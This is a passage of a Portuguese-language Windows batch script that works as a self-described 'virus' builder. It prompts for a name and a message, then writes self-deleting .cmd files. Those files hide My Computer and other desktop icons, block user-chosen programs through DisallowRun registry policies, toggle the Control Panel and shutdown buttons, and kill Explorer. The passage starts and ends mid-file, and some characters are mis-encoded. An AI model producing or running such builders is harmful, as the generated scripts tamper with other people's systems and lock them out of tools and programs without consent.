echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:a7
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a7
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:v5
mode 65,18
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= para Remover a Lixeira, Meu computador, 
echo      Meus documentos, e Meus locais de rede da area de trebalho
echo.
echo  { 2 ^<= Voltar com a Lixeira, Meu computador, 
echo         e Meus documentos, Meus locais de rede,
echo ________________________________________________________________
echo          Isto vai impedir o acesso a Meu computador 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == 1 goto a9
if %k% == 2 goto a7
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v5
:a9
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a10
if %k% == n goto a12
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a9
:a10
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a11
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite =- 
if %s5% == 1 goto t2
if %s5% == 2 goto a10
if %s5% == 3 goto a13
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a11
:t2
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a11
:a13
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a13
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {645FF040-5081-101B-9F08-00AA002F954E} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {450D8FBA-AD25-11D0-98A8-0800361B1103} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetHood /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:a12
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a12
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {450D8FBA-AD25-11D0-98A8-0800361B1103} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {645FF040-5081-101B-9F08-00AA002F954E} /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetHood /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:a14
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a14
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {645FF040-5081-101B-9F08-00AA002F954E} /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {450D8FBA-AD25-11D0-98A8-0800361B1103} /t REG_DWORD /d 0x00000000 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 0x00000000 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoNetHood /t REG_DWORD /d 0x00000000 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto in
:v6
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear um programa ?
echo.
echo  { 2 ^<= Desbloquear um programa ?
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a15
if %k% == 2 goto a22
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v6

:a15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Aqui digite ou cole o nome do program que deseja bloquear 
echo.
echo  { Coloque o nome do executavel por-EX Skype =- cmd =- regedit
echo. 
echo  { Lembre-se que Nome de executavel nฦo contem  espao 
echo.
echo  { Nฦo coloque a extensฦo 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k8= Digite o nome do programa =- 
:a16
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a17
if %k% == n goto a20
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a16
:a17
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a18
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto t3
if %s5% == 2 goto a17
if %s5% == 3 goto a19
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a18
:t3
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a18
:a19
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a19
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
 echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
 echo REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v %k8% /t REG_SZ /d %k8%.exe /f >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a20
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a20
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
echo REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v %k8% /t REG_SZ /d %k8%.exe /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a22
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo  { Digite ou cole o nome do programa que deseja Desbloquear 
echo.
echo  { Sem a extensฦ da mesma forma que foi feito para bloquear
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k10= Digite Nome do programa =- 
:a23
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a23
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v %k10% /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:v7
mode 65,20
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Esconder o botฦo  Desligar
echo.
echo  { 2 ^<= Esconder o botฦo  Logoff
echo.
echo  { 3 ^<= Esconder os dois botไes Logoff e Deligar
echo.
echo  { 4 ^<= Mostra o botฦo  Desligar
echo.
echo  { 5 ^<= Mostra o botฦo  Logoff
echo.
echo  { 6 ^<= Mostra os dois botไes Logoff e Deligar
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == 1 goto a24
if %k% == 2 goto a24
if %k% == 3 goto a24
if %k% == 4 goto a29
if %k% == 5 goto a38
if %k% == 6 goto a39
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ D 1 A 6 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v7
:a24
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a25
if %k% == n goto a28
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a24
:a25
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a26
cls
echo.
